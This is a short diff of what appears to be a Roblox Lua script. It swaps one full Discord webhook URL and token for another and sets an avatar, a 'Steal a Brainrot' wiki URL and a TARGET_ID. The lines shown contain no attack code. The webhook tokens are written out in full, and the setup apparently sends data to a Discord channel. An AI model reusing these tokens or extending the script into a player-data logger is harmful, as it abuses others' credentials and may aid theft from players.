@@ -11,7 +11,7 @@ end)
 
 task.spawn(function()
 
-local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1511902765381849198/ABbQdpLU4200iUcPG8FGbK0JfjamWC7aR4l8rfQ15yTKi5XcblwJP4lWZtLQ1GX85b1f"
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1515745099307548694/OKULMTsHlwon7iQF3mqa6nZMUEU8Nm5PUDXBZK19zgmrwy15U5B7SP-TJAjO84eh98Lk"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = 9271621711
